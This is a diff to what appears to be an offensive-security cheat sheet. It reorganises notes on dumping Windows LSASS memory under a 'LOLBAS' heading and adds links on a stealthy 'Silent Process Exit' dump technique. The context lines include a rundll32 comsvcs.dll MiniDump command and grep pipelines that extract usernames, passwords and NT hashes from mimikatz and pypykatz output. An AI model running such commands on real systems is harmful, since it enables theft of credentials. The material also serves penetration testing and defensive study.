@@ -1683,7 +1683,10 @@ $ sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose
 
 
 
-### comsvcs.dll
+### LOLBAS
+
+
+#### comsvcs.dll
 
 * [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz#comsvcs-dll](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz#comsvcs-dll)
 
@@ -1693,8 +1696,7 @@ PS C:\Windows\System32 > .\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDum
 ```
 
 
-
-### ProcDump
+#### ProcDump
 
 * [https://docs.microsoft.com/en-us/sysinternals/downloads/procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)
 * [https://download.sysinternals.com/files/Procdump.zip](https://download.sysinternals.com/files/Procdump.zip)
@@ -1717,6 +1719,12 @@ $ grep '* Username : ' lsass-mimikatz.minidump -A2 | grep -e Username -e Passwor
 $ grep -P '\tusername ' lsass-pypykatz.minidump -A2 | grep -e username -e password | grep -v None | xclip -i -sel c
 $ grep -P 'Username: ' lsass-pypykatz.minidump -A4 | grep -e Username -e Domain -e NT | grep -v None | xclip -i -sel c
 ```
+
+
+#### Silent Process Exit
+
+* [https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/](https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/)
+* [https://github.com/deepinstinct/LsassSilentProcessExit](https://github.com/deepinstinct/LsassSilentProcessExit)
 
 
 
